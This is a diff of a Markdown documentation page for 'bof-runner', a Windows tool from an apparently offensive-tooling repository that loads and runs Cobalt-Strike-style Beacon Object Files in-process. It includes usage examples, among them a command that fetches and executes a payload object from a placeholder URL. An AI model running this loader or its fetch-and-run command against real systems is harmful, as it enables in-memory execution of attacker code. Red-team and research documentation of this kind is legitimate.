@@ -1,21 +1,25 @@
 # `bof-runner`
 
-Source: [`cmd/bof-runner/`](https://github.com/oioio-space/maldev/tree/master/cmd/bof-runner) ·
-godoc: [pkg.go.dev/github.com/oioio-space/maldev/cmd/bof-runner](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/bof-runner)
+> Standalone runner for Beacon Object Files (CS-compatible COFF).
+
+**Source:** [`cmd/bof-runner/`](https://github.com/oioio-space/maldev/tree/master/cmd/bof-runner) · **godoc:** [pkg.go.dev/…/cmd/bof-runner](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/bof-runner)
+**Audience:** operator + researcher · **Platforms:** Windows only
+
+## Synopsis
+
+```text
+bof-runner -file <path.o>  [-arg-int N] [-arg-string S] [-arg-short N] [-arg-bytes <hex>]
+bof-runner -url  <https://…>   [same args]
+```
 
 ## What it does
 
-go:build windows
-bof-runner — execute a Beacon Object File and print its output.
-Usage:
-	bof-runner -file path/to/file.o [-arg-int N] [-arg-string S] [-arg-short N] [-arg-bytes hex]
-	bof-runner -url https://... [...]
-Args are packed in CS-compatible BeaconDataPack format and consumed
-by the BOF via BeaconDataParse / DataInt / DataShort / DataExtract.
-Designed to run real-world BOFs from the public ecosystem
-(TrustedSec situational-awareness, Outflank, FortyNorth TerraTwist,
-the Cobalt-Strike-community-kit, …). Constraints documented in
-docs/techniques/runtime/bof-loader.md "Beacon-API limitations".
+Loads a Cobalt-Strike-style COFF object into the current process and runs its
+`go` entrypoint. Arguments are packed in BeaconDataPack format and consumed by
+the BOF via `BeaconDataInt` / `DataShort` / `DataExtract`. Validated against
+the public BOF ecosystem (TrustedSec SA, Outflank, FortyNorth, CS community
+kit). Constraints documented in
+[`runtime/bof-loader`](../techniques/runtime/bof-loader.md#beacon-api-limitations).
 
 ## Build
 
@@ -23,17 +27,17 @@ docs/techniques/runtime/bof-loader.md "Beacon-API limitations".
 GOOS=windows GOARCH=amd64 go build -o bof-runner.exe ./cmd/bof-runner
 ```
 
-For platform-native builds, drop the `GOOS` / `GOARCH` prefix.
+## Examples
 
-## Help / flags
+```cmd
+:: Run an enumeration BOF with two args (int + string)
+bof-runner.exe -file whoami.o -arg-int 1 -arg-string "DOMAIN\user"
 
-Run with `-h` to see the current flag set:
-
-```bash
-./bof-runner -h
+:: Fetch and run from a URL (research / sandbox use)
+bof-runner.exe -url https://example.invalid/payload.o
 ```
 
-## Related
+## See also
 
-- Reference for the underlying packages: see the [Techniques tree](../techniques/).
-- Runnable examples: see [Runnable examples](../examples/runnable.md).
+- Technique: [`runtime/bof-loader`](../techniques/runtime/bof-loader.md).
+- Glossary: [BOF](../glossary.md).
